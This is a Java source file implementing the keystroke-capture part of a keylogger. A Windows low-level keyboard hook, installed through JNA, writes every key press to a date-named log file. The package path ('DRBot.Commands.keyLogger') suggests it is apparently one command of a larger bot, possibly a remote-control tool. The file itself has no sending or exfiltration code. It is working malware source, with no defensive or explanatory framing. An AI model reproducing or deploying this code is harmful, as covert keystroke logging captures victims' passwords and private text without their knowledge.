package com.DRBot.Commands.keyLogger.keyLog;

/**
 *
 * @author MerNat
 */

import com.DRBot.Commands.keyLogger.utility.LoggerUtil;
import com.DRBot.Commands.keyLogger.utility.TimeUtil;

import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef.LRESULT;
import com.sun.jna.platform.win32.WinDef.WPARAM;
import com.sun.jna.platform.win32.WinUser;
import com.sun.jna.platform.win32.WinUser.KBDLLHOOKSTRUCT;
import com.sun.jna.platform.win32.WinUser.LowLevelKeyboardProc;
import java.awt.event.KeyEvent;
import java.util.Date;

public final class WindowsKeyboardHook implements LowLevelKeyboardProc {

    private static final String LOG_HEADINGS = TimeUtil.getCurrentDateTime()+"\r\n";
    private static final Date date = new Date();
    private static final String KLname = date.getDate()+"-"+(date.getMonth()+1)+"-"+(1900+date.getYear());

    private static final LoggerUtil LOGGER = LoggerUtil.getLogger(getKLname(), true, false,LOG_HEADINGS);//csv //last is LOG_HEADINGS

    private final WindowsKeyboardHookParent parent;

    public WindowsKeyboardHook(final WindowsKeyboardHookParent parent) {
        this.parent = parent;
    }

    public WindowsKeyboardHook() {
        throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }

    @Override
    public LRESULT callback(final int nCode, final WPARAM wParam, final KBDLLHOOKSTRUCT info) {
        if (nCode >= 0) {
            if (wParam.intValue() == WinUser.WM_KEYDOWN) {
                switch(info.vkCode){
                    case 13:
                        LOGGER.log(" Enter\r\n");
                        break;
                    case 32:
                        LOGGER.log(" ");
                        break;
                    case 190:
                        LOGGER.log(".");
                        break;
                    case 191:
                        LOGGER.log("/");
                        break;
                    case 160:
                        LOGGER.log("?");
                        break;
                    case 188:
                        LOGGER.log(",");
                        break;
                    case 186:
                        LOGGER.log(";");
                        break;
                    default:
                        LOGGER.log(KeyEvent.getKeyText(info.vkCode).toLowerCase());
                        break;
                }
            }
        }
        return User32.INSTANCE.CallNextHookEx(parent.getHHOOK(), nCode, wParam, info.getPointer());
    }
    public static String getKLname(){
        return KLname;
    }
}

